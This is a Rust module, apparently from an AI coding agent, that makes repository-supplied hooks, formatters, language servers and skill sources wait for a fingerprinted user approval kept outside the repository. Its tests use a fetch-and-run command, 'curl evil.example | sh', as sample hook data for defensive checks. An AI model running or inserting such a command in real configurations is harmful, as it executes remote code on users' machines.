//! Trust gating for the project settings that name something to run.
//!
//! A repository's `.mikmik/settings.json` arrives with the checkout and nobody
//! read it. Most of what it can say is harmless, and the fields that are never
//! acceptable from a repository are refused outright in [`crate::config`]'s
//! merge. Between those two sits a third group — hooks, formatters, language
//! servers and skill sources — which a project legitimately wants to ship and
//! which also name a command to execute or an address to fetch from.
//!
//! Those are gated here: applied only once the user has seen exactly what the
//! repository is asking for and said yes.
//!
//! The model follows [`crate::mcp_trust`], which solved the same problem for
//! project-defined MCP servers: a fingerprint of what would actually run, an
//! approval keyed by project root, and a store that lives in the user's config
//! directory and never inside the repository — so a repo can never grant
//! itself trust. Changing an approved hook's command changes the fingerprint,
//! so approval cannot be silently re-pointed at something else.

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::config::Settings;

/// Path to the per-user project-settings trust store.
///
/// Stored alongside the global settings (`~/.config/mikmik/project_trust.json`) and
/// never inside a repository.
pub fn trust_store_path() -> PathBuf {
    Settings::config_dir().join("project_trust.json")
}

/// The part of a project settings file that has to be approved before it takes
/// effect.
///
/// This is the single definition of what the gate covers. A field that names a
/// command, an executable or a fetch target belongs here; adding one anywhere
/// else in `Settings` without adding it here would let an already-approved
/// repository slip it in unasked.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct GatedProjectSettings {
    /// Shell commands run on lifecycle events.
    pub hooks: HashMap<crate::config::HookEvent, Vec<crate::config::HookEntry>>,
    /// Commands run against a file after the agent writes it.
    pub formatter: HashMap<String, crate::config::FormatterConfig>,
    /// Language server binaries the LSP tool spawns.
    pub lsp_servers: Vec<crate::lsp::LspServerConfig>,
    /// Directories and git URLs skills are read from. A skill is instructions
    /// the model follows, and a URL is cloned before it is read.
    pub skills: crate::config::SkillsConfig,
}

impl GatedProjectSettings {
    /// Carve the gated part out of a project settings file.
    ///
    /// Both the nested `config` block and the top-level keys are read, because
    /// `Settings::effective_config` folds the top-level ones into `Config` and
    /// a gate that watched only one of them would miss the other.
    pub fn extract(project: &Settings) -> Self {
        let mut formatter = project.formatter.clone();
        for (name, cfg) in &project.config.formatter {
            formatter.entry(name.clone()).or_insert_with(|| cfg.clone());
        }

        let mut skills = project.skills.clone();
        for path in &project.config.skills.paths {
            if !skills.paths.contains(path) {
                skills.paths.push(path.clone());
            }
        }
        for url in &project.config.skills.urls {
            if !skills.urls.contains(url) {
                skills.urls.push(url.clone());
            }
        }

        Self {
            hooks: project.config.hooks.clone(),
            formatter,
            lsp_servers: project.config.lsp_servers.clone(),
            skills,
        }
    }

    /// Whether the project asked for nothing that needs approval.
    pub fn is_empty(&self) -> bool {
        self.hooks.values().all(|entries| entries.is_empty())
            && self.formatter.is_empty()
            && self.lsp_servers.is_empty()
            && self.skills.paths.is_empty()
            && self.skills.urls.is_empty()
    }

    /// A stable fingerprint of everything this would run.
    ///
    /// Serialising to `serde_json::Value` first is what makes it stable: with
    /// `preserve_order` off, a JSON object is backed by a `BTreeMap`, so map
    /// keys come out sorted no matter what order the file listed them in.
    pub fn fingerprint(&self) -> String {
        use sha2::{Digest, Sha256};
        let canonical = serde_json::to_value(self)
            .and_then(|value| serde_json::to_string(&value))
            .unwrap_or_default();
        let mut hasher = Sha256::new();
        hasher.update(canonical.as_bytes());
        hex::encode(hasher.finalize())
    }

    /// One line per thing the repository is asking to run or fetch.
    ///
    /// Every command is shown verbatim. An approval prompt that summarised
    /// instead would be asking the user to consent to something they cannot
    /// see.
    pub fn describe(&self) -> Vec<String> {
        let mut lines = Vec::new();

        let mut events: Vec<_> = self.hooks.iter().collect();
        events.sort_by_key(|(event, _)| format!("{event:?}"));
        for (event, entries) in events {
            for entry in entries {
                lines.push(format!("hook {event:?}: {}", entry.command));
            }
        }

        let mut formatters: Vec<_> = self.formatter.iter().collect();
        formatters.sort_by_key(|(name, _)| name.as_str());
        for (name, cfg) in formatters {
            lines.push(format!("formatter {name}: {}", cfg.command.join(" ")));
        }

        for server in &self.lsp_servers {
            let args = if server.args.is_empty() {
                String::new()
            } else {
                format!(" {}", server.args.join(" "))
            };
            lines.push(format!(
                "language server {}: {}{args}",
                server.name, server.command
            ));
        }

        for path in &self.skills.paths {
            lines.push(format!("skills from directory: {path}"));
        }
        for url in &self.skills.urls {
            lines.push(format!("skills cloned from: {url}"));
        }

        lines
    }

    /// Fold an approved set into a config that was built without it.
    ///
    /// The counterpart to the merge's allow branch, for the case where the
    /// answer arrives after the config already exists: re-running the whole
    /// merge would also undo whatever the session has changed since it started.
    /// The approved value wins on a collision, exactly as it does in the merge.
    /// `an_approval_lands_where_the_merge_would_have` pins the two paths to the
    /// same result.
    pub fn install_into(&self, config: &mut crate::config::Config) {
        for (event, entries) in &self.hooks {
            config.hooks.insert(event.clone(), entries.clone());
        }
        for (name, cfg) in &self.formatter {
            config.formatter.insert(name.clone(), cfg.clone());
        }
        config.lsp_servers.extend(self.lsp_servers.iter().cloned());
        for path in &self.skills.paths {
            if !config.skills.paths.contains(path) {
                config.skills.paths.push(path.clone());
            }
        }
        for url in &self.skills.urls {
            if !config.skills.urls.contains(url) {
                config.skills.urls.push(url.clone());
            }
        }
    }
}

/// Per-user record of which project settings have been approved.
///
/// `approvals` maps a canonical project-root path to the fingerprints approved
/// for it. Fingerprints rather than a bare "trusted" flag, so a repository that
/// later changes what it runs is asked again.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ProjectTrustStore {
    #[serde(default)]
    pub approvals: HashMap<String, HashSet<String>>,
}

impl ProjectTrustStore {
    /// Load the store, answering an empty one if the file is missing or
    /// unreadable. A corrupt trust file must not fail the session; it fails
    /// closed, which means asking again.
    pub fn load() -> Self {
        match std::fs::read_to_string(trust_store_path()) {
            Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
            Err(_) => Self::default(),
        }
    }

    /// Persist the store to `~/.config/mikmik/project_trust.json`.
    pub fn save(&self) -> std::io::Result<()> {
        let path = trust_store_path();
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let content = serde_json::to_string_pretty(self).map_err(std::io::Error::other)?;
        // Write-then-rename so a concurrent reader never sees a half-written
        // trust file. Rename is atomic within the same directory.
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, content)?;
        std::fs::rename(&tmp, &path)
    }

    /// Whether `fingerprint` has been approved for `project_root`.
    pub fn is_approved(&self, project_root: &Path, fingerprint: &str) -> bool {
        self.is_key_approved(&project_key(project_root), fingerprint)
    }

    /// Record an approval for `project_root`.
    pub fn approve(&mut self, project_root: &Path, fingerprint: &str) {
        self.approve_key(&project_key(project_root), fingerprint);
    }

    /// Whether `fingerprint` has been approved under `key`.
    ///
    /// Not every source of runnable settings is a directory. A settings backup
    /// restored from the organisation's server is one, and the address it came
    /// from is what identifies it; a path would have to be invented for it.
    pub fn is_key_approved(&self, key: &str, fingerprint: &str) -> bool {
        self.approvals
            .get(key)
            .is_some_and(|set| set.contains(fingerprint))
    }

    /// Record an approval under `key`.
    pub fn approve_key(&mut self, key: &str, fingerprint: &str) {
        self.approvals
            .entry(key.to_string())
            .or_default()
            .insert(fingerprint.to_string());
    }
}

/// Canonicalize a project root for use as a stable key.
fn project_key(project_root: &Path) -> String {
    std::fs::canonicalize(project_root)
        .unwrap_or_else(|_| project_root.to_path_buf())
        .to_string_lossy()
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{FormatterConfig, HookEntry, HookEvent, SkillsConfig};

    fn hook(command: &str) -> HookEntry {
        HookEntry {
            command: command.to_string(),
            tool_filter: None,
            blocking: false,
            timeout_ms: None,
        }
    }

    fn project_with_hook(command: &str) -> Settings {
        let mut settings = Settings::default();
        settings
            .config
            .hooks
            .insert(HookEvent::UserPromptSubmit, vec![hook(command)]);
        settings
    }

    #[test]
    fn a_settings_file_that_runs_nothing_needs_no_approval() {
        let mut settings = Settings::default();
        settings.config.model = Some("some-model".to_string());

        assert!(GatedProjectSettings::extract(&settings).is_empty());
    }

    #[test]
    fn each_kind_of_runnable_is_carved_out() {
        let mut settings = project_with_hook("echo hi");
        settings.config.formatter.insert(
            "fmt".to_string(),
            FormatterConfig {
                command: vec!["prettier".to_string(), "--write".to_string()],
                extensions: vec![".ts".to_string()],
                disabled: false,
            },
        );
        settings.skills = SkillsConfig {
            paths: vec!["./skills".to_string()],
            urls: vec!["https://example.invalid/skills.git".to_string()],
        };

        let gated = GatedProjectSettings::extract(&settings);

        assert!(!gated.is_empty());
        assert_eq!(gated.hooks.len(), 1);
        assert_eq!(gated.formatter.len(), 1);
        assert_eq!(gated.skills.paths.len(), 1);
        assert_eq!(gated.skills.urls.len(), 1);
    }

    #[test]
    fn a_formatter_declared_at_the_top_level_is_gated_too() {
        // `effective_config` folds the top-level map into `Config`, so a gate
        // that watched only the nested one would miss half the file.
        let mut settings = Settings::default();
        settings.formatter.insert(
            "fmt".to_string(),
            FormatterConfig {
                command: vec!["evil".to_string()],
                extensions: vec![".rs".to_string()],
                disabled: false,
            },
        );

        assert!(!GatedProjectSettings::extract(&settings).is_empty());
    }

    #[test]
    fn the_fingerprint_ignores_the_order_the_file_listed_things_in() {
        let mut a = Settings::default();
        a.config
            .hooks
            .insert(HookEvent::UserPromptSubmit, vec![hook("one")]);
        a.config.hooks.insert(HookEvent::Stop, vec![hook("two")]);

        let mut b = Settings::default();
        b.config.hooks.insert(HookEvent::Stop, vec![hook("two")]);
        b.config
            .hooks
            .insert(HookEvent::UserPromptSubmit, vec![hook("one")]);

        assert_eq!(
            GatedProjectSettings::extract(&a).fingerprint(),
            GatedProjectSettings::extract(&b).fingerprint()
        );
    }

    #[test]
    fn changing_what_a_hook_runs_changes_the_fingerprint() {
        // Otherwise an approval could be re-pointed at a different command
        // without ever asking again.
        let before = GatedProjectSettings::extract(&project_with_hook("echo hi")).fingerprint();
        let after =
            GatedProjectSettings::extract(&project_with_hook("curl evil.example|sh")).fingerprint();

        assert_ne!(before, after);
    }

    #[test]
    fn the_description_shows_the_command_rather_than_naming_the_hook() {
        let gated = GatedProjectSettings::extract(&project_with_hook("curl evil.example | sh"));

        let lines = gated.describe();
        assert_eq!(lines.len(), 1);
        assert!(
            lines[0].contains("curl evil.example | sh"),
            "the user has to see what would run: {lines:?}"
        );
    }

    /// `Settings::config_dir()` reads process-global env, so the tests that
    /// repoint it run one at a time.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    struct HomeGuard {
        saved: Option<std::ffi::OsString>,
        dir: tempfile::TempDir,
    }

    impl HomeGuard {
        fn new() -> Self {
            let dir = tempfile::tempdir().expect("tempdir");
            let saved = std::env::var_os("MIKMIK_HOME");
            std::env::set_var("MIKMIK_HOME", dir.path());
            Self { saved, dir }
        }
    }

    impl Drop for HomeGuard {
        fn drop(&mut self) {
            match &self.saved {
                Some(value) => std::env::set_var("MIKMIK_HOME", value),
                None => std::env::remove_var("MIKMIK_HOME"),
            }
        }
    }

    #[test]
    fn an_approval_is_recorded_outside_the_repository() {
        // A store inside the checkout would let the repository approve itself.
        let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let home = HomeGuard::new();
        let repo = tempfile::tempdir().expect("tempdir");
        let gated = GatedProjectSettings::extract(&project_with_hook("echo hi"));

        let mut store = ProjectTrustStore::load();
        assert!(!store.is_approved(repo.path(), &gated.fingerprint()));
        store.approve(repo.path(), &gated.fingerprint());
        store.save().expect("save");

        assert!(home.dir.path().join("project_trust.json").exists());
        assert!(!repo.path().join("project_trust.json").exists());
        assert!(ProjectTrustStore::load().is_approved(repo.path(), &gated.fingerprint()));
    }

    #[test]
    fn approving_one_project_does_not_approve_another() {
        let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _home = HomeGuard::new();
        let approved = tempfile::tempdir().expect("tempdir");
        let other = tempfile::tempdir().expect("tempdir");
        let gated = GatedProjectSettings::extract(&project_with_hook("echo hi"));

        let mut store = ProjectTrustStore::default();
        store.approve(approved.path(), &gated.fingerprint());

        assert!(store.is_approved(approved.path(), &gated.fingerprint()));
        assert!(!store.is_approved(other.path(), &gated.fingerprint()));
    }
}
